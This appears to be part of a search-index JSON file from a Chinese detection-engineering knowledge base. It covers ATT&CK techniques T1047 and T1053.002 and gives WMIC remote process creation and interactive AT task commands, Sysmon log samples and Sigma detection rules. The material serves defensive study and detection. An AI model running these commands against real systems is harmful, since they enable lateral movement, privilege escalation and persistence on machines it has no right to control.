http://www.safe6.cn/article/155","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/","text":"T1047-win-\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows\u7ba1\u7406\u89c4\u8303\uff08WMI\uff09\u662fWindows\u7ba1\u7406\u529f\u80fd\uff0c\u5b83\u4e3a\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95eeWindows\u7cfb\u7edf\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u73af\u5883\u3002\u5b83\u4f9d\u9760WMI\u670d\u52a1\u8fdb\u884c\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u5e76\u4f9d\u9760\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u548c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u670d\u52a1\uff08RPCS\uff09\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u3002RPCS\u901a\u8fc7\u7aef\u53e3135\u8fd0\u884c\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528WMI\u4e0e\u672c\u5730\u548c\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff0c\u5e76\u5c06\u5176\u7528\u4f5c\u6267\u884c\u8bb8\u591a\u6218\u672f\u529f\u80fd\u7684\u624b\u6bb5\uff0c\u4f8b\u5982\u6536\u96c6\u4fe1\u606f\u4ee5\u8fdb\u884c\u53d1\u73b0\u548c\u8fdc\u7a0b\u6267\u884c\u6587\u4ef6\uff08\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528Windows Management Instrumentation\uff08WMI\uff09\u901a\u8fc7\u8fdc\u7a0b\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6\u6765\u6a2a\u5411\u79fb\u52a8\u3002\u672c\u6848\u4f8b\u63cf\u8ff0\u4e86\u5982\u4f55\u4f7f\u7528\u7f51\u7edc\u6d41\u91cf\u76d1\u89c6\u548c\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u8fdb\u7a0b\u76d1\u89c6\u6765\u68c0\u6d4b\u8fd9\u4e9b\u8fdb\u7a0b\u3002\u4f46\u662f\uff0c\u5982\u679c\u5728\u6e90\u4e3b\u673a\u4e0a\u4f7f\u7528\u4e86\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fwmic.exe\uff0c\u5219\u53ef\u4ee5\u5728\u5206\u6790\u4e2d\u53e6\u5916\u68c0\u6d4b\u5230\u5b83\u3002\u6e90\u4e3b\u673a\u4e0a\u7684\u547d\u4ee4\u884c\u88ab\u6784\u5efa\u4e3a\u7c7b\u4f3cwmic.exe /node:\"\\<hostname>\" process call create \"\\<command line>\"\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7IP\u5730\u5740\u8fdb\u884c\u8fde\u63a5\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b57\u7b26\u4e32\"\\<hostname>\"\u4fee\u6539\u4e3aIP\u5730\u5740\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6e90\u4e3b\u673a\u6267\u884c\uff1awmic.exe /node:\"\\<hostname>\" process \u6d4b\u8bd5\u7559\u75d5 \u4e8b\u4ef6ID\uff0c\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u8fdb\u7a0b\u540d\u79f0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def title: \u901a\u8fc7wmic\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b description: windows server 2016 status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: system detection: \u200b selection: \u200b EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa \u200b Newprocessname: 'C:\\Windows\\System32\\wbem\\WMIC.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: 'wmic.exe /node:* process *' #\u8fdb\u7a0b\u547d\u4ee4\u884c \u200b condition: selection level: medium \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1047 https://attack.mitre.org/techniques/T1047/ CAR-2016-03-002\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b https://car.mitre.org/analytics/CAR-2016-03-002/ wmic\u547d\u4ee4\u6536\u96c6\u4e0e\u6574\u7406 https://blog.csdn.net/qq_20307987/article/details/7322203 wmic\u5185\u7f51\u4f7f\u7528 https://www.cnblogs.com/0xdd/p/11393392.html","title":"T1047-win-\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#t1047-win-wmic","text":"","title":"T1047-win-\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#attck","text":"Windows\u7ba1\u7406\u89c4\u8303\uff08WMI\uff09\u662fWindows\u7ba1\u7406\u529f\u80fd\uff0c\u5b83\u4e3a\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95eeWindows\u7cfb\u7edf\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u73af\u5883\u3002\u5b83\u4f9d\u9760WMI\u670d\u52a1\u8fdb\u884c\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u5e76\u4f9d\u9760\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u548c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u670d\u52a1\uff08RPCS\uff09\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u3002RPCS\u901a\u8fc7\u7aef\u53e3135\u8fd0\u884c\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528WMI\u4e0e\u672c\u5730\u548c\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff0c\u5e76\u5c06\u5176\u7528\u4f5c\u6267\u884c\u8bb8\u591a\u6218\u672f\u529f\u80fd\u7684\u624b\u6bb5\uff0c\u4f8b\u5982\u6536\u96c6\u4fe1\u606f\u4ee5\u8fdb\u884c\u53d1\u73b0\u548c\u8fdc\u7a0b\u6267\u884c\u6587\u4ef6\uff08\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_1","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528Windows Management Instrumentation\uff08WMI\uff09\u901a\u8fc7\u8fdc\u7a0b\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6\u6765\u6a2a\u5411\u79fb\u52a8\u3002\u672c\u6848\u4f8b\u63cf\u8ff0\u4e86\u5982\u4f55\u4f7f\u7528\u7f51\u7edc\u6d41\u91cf\u76d1\u89c6\u548c\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u8fdb\u7a0b\u76d1\u89c6\u6765\u68c0\u6d4b\u8fd9\u4e9b\u8fdb\u7a0b\u3002\u4f46\u662f\uff0c\u5982\u679c\u5728\u6e90\u4e3b\u673a\u4e0a\u4f7f\u7528\u4e86\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fwmic.exe\uff0c\u5219\u53ef\u4ee5\u5728\u5206\u6790\u4e2d\u53e6\u5916\u68c0\u6d4b\u5230\u5b83\u3002\u6e90\u4e3b\u673a\u4e0a\u7684\u547d\u4ee4\u884c\u88ab\u6784\u5efa\u4e3a\u7c7b\u4f3cwmic.exe /node:\"\\<hostname>\" process call create \"\\<command line>\"\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7IP\u5730\u5740\u8fdb\u884c\u8fde\u63a5\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b57\u7b26\u4e32\"\\<hostname>\"\u4fee\u6539\u4e3aIP\u5730\u5740\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_3","text":"\u6e90\u4e3b\u673a\u6267\u884c\uff1awmic.exe /node:\"\\<hostname>\" process","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_4","text":"\u4e8b\u4ef6ID\uff0c\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u8fdb\u7a0b\u540d\u79f0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_5","text":"title: \u901a\u8fc7wmic\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b description: windows server 2016 status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: system detection: \u200b selection: \u200b EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa \u200b Newprocessname: 'C:\\Windows\\System32\\wbem\\WMIC.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: 'wmic.exe /node:* process *' #\u8fdb\u7a0b\u547d\u4ee4\u884c \u200b condition: selection level: medium","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_6","text":"MITRE-ATT&CK-T1047 https://attack.mitre.org/techniques/T1047/ CAR-2016-03-002\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b https://car.mitre.org/analytics/CAR-2016-03-002/ wmic\u547d\u4ee4\u6536\u96c6\u4e0e\u6574\u7406 https://blog.csdn.net/qq_20307987/article/details/7322203 wmic\u5185\u7f51\u4f7f\u7528 https://www.cnblogs.com/0xdd/p/11393392.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/","text":"T1053-002-win-\u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002 \u6d4b\u8bd5\u6848\u4f8b AT\u547d\u4ee4\u867d\u7136\u81eaWin8\u7cfb\u7edf\u8d77\u5df2\u7ecf\u5f03\u7528\uff0c\u9700\u8981\u4f7f\u7528SCHTASKS\u547d\u4ee4\u4e86\uff0c\u4f46\u76ee\u524d\u6765\u770bwin7\u7684\u4f7f\u7528\u8303\u56f4\u8fd8\u662f\u5f88\u5e7f\u6cdb\u7684\u3002 at time /interactive command ---\u7ed9\u7528\u6237\u4e00\u4e2a\u4e0e\u7a0b\u5e8f\u6216\u547d\u4ee4\u53c2\u4e0e\u4ea4\u4e92\u7684\u673a\u4f1a \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6210\u529f\u6267\u884c\u540e\uff0ccmd.exe\u5c06\u751f\u6210at.exe\u5e76\u521b\u5efa\u8ba1\u5212\u4efb\u52a1\uff0c\u8be5\u4efb\u52a1\u5c06\u5728\u7279\u5b9a\u65f6\u95f4\u751f\u6210cmd\u3002 at 17:28 /interactive cmd \u6d4b\u8bd5\u7559\u75d5 # sysmon_log\uff0c\u4e8b\u4ef6ID\uff1a1 Process Create: RuleName: - UtcTime: 2020-11-29 09:16:59.072 ProcessGuid: {bb1f7c32-670b-5fc3-8000-000000001800} ProcessId: 2548 Image: C:\\Windows\\System32\\at.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Schedule service command line interface Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: AT.EXE CommandLine: at 17:28 /interactive cmd CurrentDirectory: C:\\Users\\12306Br0\\Desktop\\Sysmon\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-6401-5fc3-e5b7-1a0000000000} LogonId: 0x1ab7e5 TerminalSessionId: 1 IntegrityLevel: High \u68c0\u6d4b\u89c4\u5219/\u601d\u8def title: \u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1 description: \u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1\uff0c\u53ef\u80fd\u662f\u63d0\u6743\u884c\u4e3a author: 12306Br0 date: 2020/11/29 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1053.002/T1053.002.md - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html tags: - attack.persistence - attack.lateral_movement - attack.t1053-002 logsource: product: windows service: sysmon #\u81ea\u884c\u914d\u7f6e detection: selection: EventID: 1 #\u8fdb\u7a0b\u521b\u5efa Image: 'at.exe' CommandLine: '* interactive *' condition: selection level: low \u5efa\u8bae \u9664\u4e86\u57fa\u4e8esysmon\u65e5\u5fd7\u4e4b\u5916\uff0c\u9ad8\u7248\u672c\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u4e2d4688\u8fdb\u884c\u68c0\u6d4b \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1053-002 https://attack.mitre.org/techniques/T1053/002/ CMD\u547d\u4ee4\u884c\u8ba1\u5212\u4efb\u52a1\u8bbe\u7f6e-AT https://baijiahao.baidu.com/s?id=1593905611581087845&wfr=spider&for=pc","title":"T1053-002-win-\u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#t1053-002-win-at","text":"","title":"T1053-002-win-\u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#attck","text":"\u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_1","text":"AT\u547d\u4ee4\u867d\u7136\u81eaWin8\u7cfb\u7edf\u8d77\u5df2\u7ecf\u5f03\u7528\uff0c\u9700\u8981\u4f7f\u7528SCHTASKS\u547d\u4ee4\u4e86\uff0c\u4f46\u76ee\u524d\u6765\u770bwin7\u7684\u4f7f\u7528\u8303\u56f4\u8fd8\u662f\u5f88\u5e7f\u6cdb\u7684\u3002 at time /interactive command ---\u7ed9\u7528\u6237\u4e00\u4e2a\u4e0e\u7a0b\u5e8f\u6216\u547d\u4ee4\u53c2\u4e0e\u4ea4\u4e92\u7684\u673a\u4f1a","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_3","text":"\u6210\u529f\u6267\u884c\u540e\uff0ccmd.exe\u5c06\u751f\u6210at.exe\u5e76\u521b\u5efa\u8ba1\u5212\u4efb\u52a1\uff0c\u8be5\u4efb\u52a1\u5c06\u5728\u7279\u5b9a\u65f6\u95f4\u751f\u6210cmd\u3002 at 17:28 /interactive cmd","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_4","text":"# sysmon_log\uff0c\u4e8b\u4ef6ID\uff1a1 Process Create: RuleName: - UtcTime: 2020-11-29 09:16:59.072 ProcessGuid: {bb1f7c32-670b-5fc3-8000-000000001800} ProcessId: 2548 Image: C:\\Windows\\System32\\at.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Schedule service command line interface Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: AT.EXE CommandLine: at 17:28 /interactive cmd CurrentDirectory: C:\\Users\\12306Br0\\Desktop\\Sysmon\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-6401-5fc3-e5b7-1a0000000000} LogonId: 0x1ab7e5 TerminalSessionId: 1 IntegrityLevel: High","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_5","text":"title: \u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1 description: \u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1\uff0c\u53ef\u80fd\u662f\u63d0\u6743\u884c\u4e3a author: 12306Br0 date: 2020/11/29 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1053.002/T1053.002.md - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html tags: - attack.persistence - attack.lateral_movement - attack.t1053-002 logsource: product: windows service: sysmon #\u81ea\u884c\u914d\u7f6e detection: selection: EventID: 1 #\u8fdb\u7a0b\u521b\u5efa Image: 'at.exe' CommandLine: '* interactive *' condition: selection level: low","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_6","text":"\u9664\u4e86\u57fa\u4e8esysmon\u65e5\u5fd7\u4e4b\u5916\uff0c\u9ad8\u7248\u672c\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u4e2d4688\u8fdb\u884c\u68c0\u6d4b","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_7","text":"MITRE-ATT&CK-T1053-002 https://attack.mitre.org/techniques/T1053/002/ CMD\u547d\u4ee4\u884c\u8ba1\u5212\u4efb\u52a1\u8bbe\u7f6e-AT https://baijiahao.baidu.com/s?id=1593905611581087845&wfr=spider&for=pc","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/","text":"T1053-002-win-\u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002 \u6d4b\u8bd5\u6848\u4f8b \u901a\u8fc7Group Policy Management Console (GPMC) \u5b9e\u73b0\u8ba1\u5212\u4efb\u52a1\u7684\u8fdc\u7a0b\u6267\u884c\uff1b \u5177\u4f53\u53ef\u53c2\u80033gstudent\u5927\u4f6c\u7684 \u6587\u7ae0 GPO\u7ec4\u7b56\u7565\u5b89\u5168 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def title: \u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c description: \u4f7f\u7528GPO\u8ba1\u5212\u4efb\u52a1\u68c0\u6d4b\u6a2a\u5411\u79fb\u52a8\uff0c\u901a\u5e38\u7528\u4e8e\u5927\u89c4\u6a21\u90e8\u7f72\u52d2\u7d22\u8f6f\u4ef6 author: 12306Br0(\u7ffb\u8bd1+\u6d4b\u8bd5) date: 2020/06/07 references: - https://twitter.com/menasec1/status/1106899890377052160 - https://www.secureworks.com/blog/ransomware-as-a-distraction tags: - attack.persistence - attack.lateral_movement - attack.t1053-002 logsource: product: windows service: security description: '\u5fc5\u987b\u4e3a\u6210\u529f/\u5931\u8d25\u914d\u7f6e\u9ad8\u7ea7\u5ba1\u6838\u7b56\u7565\u8bbe\u7f6e\u201c\u5bf9\u8c61\u8bbf\u95ee>\u5ba1\u6838\u8be6\u7ec6\u6587\u4ef6\u5171\u4eab' detection: selection: EventID: 5145 ShareName: \\\\*\\SYSVOL RelativeTargetName: '*ScheduledTasks.xml' Accesses: '*WriteData*' condition: selection falsepositives: - 